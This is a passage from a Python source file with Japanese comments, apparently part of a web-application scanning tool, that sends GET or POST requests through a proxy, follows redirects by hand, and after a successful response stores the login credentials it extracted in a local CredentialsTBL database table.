                                      files=dic_post_files,
                                      data=dic_post_data
                                      )
            else:
                # 通常のリクエスト
                if lst_target_row[8].upper() == 'POST':
                    obj_request = Request("POST",
                                          obj_decision.assemble_url(lst_target_row),
                                          data=dic_post_params_original
                                          )
                else:
                    obj_request = Request("GET",
                                          obj_decision.assemble_url(lst_target_row),
                                          params=dic_post_params_original
                                          )

            obj_prepped = obj_session.prepare_request(obj_request)
            obj_response = obj_session.send(obj_prepped,
                                            verify=True,
                                            timeout=60,
                                            proxies=PROXY,
                                            allow_redirects=False
                                            )

            # レスポンスがリダイレクトの場合
            # リダイレクトが終了するまで繰り返しリダイレクト
            # 直後のレスポンスとリダイレクト先のレスポンスを判定対象にする
            while obj_response.is_redirect is True:
                # Locationヘッダから遷移先URLを取得
                dic_res_headers = obj_response.headers._store
                tpl_location_header = dic_res_headers["location"]
                str_redirect_url = tpl_location_header[1]
                if 'http://' not in str_redirect_url and 'https://' not in str_redirect_url:
                    str_fqdn = lst_target_row[9].encode() + "://" + lst_target_row[10].encode() + ":" + str(lst_target_row[11])
                    if str_redirect_url.startswith('/') is False:
                        str_redirect_url = '/' + str_redirect_url
                    str_redirect_url = str_fqdn + str_redirect_url

                # リダイレクト
                obj_request = Request("GET", str_redirect_url)
                obj_prepped = obj_session.prepare_request(obj_request)
                obj_response = obj_session.send(obj_prepped,
                                                verify=True,
                                                timeout=60,
                                                proxies=PROXY,
                                                allow_redirects=False
                                                )

            # レスポンスコードが200系の場合、認証情報を入れ替える。
            if obj_response.status_code >= 200 and obj_response.status_code < 300:
                # 認証情報の取得
                lst_credentials, str_temp_label_value = obj_decision.decide_get_credentials(
                    obj_decision.change_dictionary_to_list(dic_post_params_original),
                    lst_target_row[22])

                # 認証情報が取得できた場合、認証情報を入れ替える
                if lst_credentials[0] is not None and lst_credentials[1] is not None:
                    str_sql = "DELETE FROM CredentialsTBL WHERE site_id = 1;"
                    obj_db_control.delete(str_sql)

                    str_sql = "INSERT INTO CredentialsTBL(" + self.str_col_credentialstbl + ") " \
                                                             "VALUES (1, 1, ?, ?, ?, ?, ?, '', '', '')"
                    lst_value = [lst_credentials[0],
                                 lst_credentials[1],
                                 lst_credentials[2],
                                 lst_credentials[3],
                                 lst_credentials[4]]
                    obj_db_control.insert(str_sql, lst_value)
        '''